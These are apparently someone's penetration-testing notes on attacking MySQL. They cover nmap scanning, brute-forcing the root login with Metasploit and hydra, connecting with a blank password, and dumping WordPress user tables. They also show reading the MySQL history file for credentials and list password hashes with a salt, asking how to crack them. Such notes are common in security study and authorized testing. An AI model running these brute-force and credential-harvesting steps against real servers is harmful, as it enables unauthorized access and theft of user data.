# MySQL

```
nmap -Pn -sV -sC -p3306 <ip>

searchsploit MySQL <version>

use auxiliary/scanner/mysql/mysql_version
```

## 
```
use auxiliary/scanner/mysql/mysql_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE false

# Leave USERNAME as root - most important account.
# root password could be NULL.
```

```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql

# hydra does not test NULL passwords?
```

```
[ERROR] Host '<hostname>' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'

# Brute-forcing can result in IP getting blocked.
```

## 
```
mysql -u root -p -h <ip>

# Press Enter if NULL password.
```

```
show databases;
use <database>;
show tables;
select * from <table>;

use wordpress;
select * from wp_users;

# Web app user info in the database.
```

```
cat ~/.mysql_history

# History file may contain credentials.
```

##
```
$P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0
$P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/

Salt: G*=2"S^\529h#r7Y=aPP (from nmap scan)

# How to crack?
```
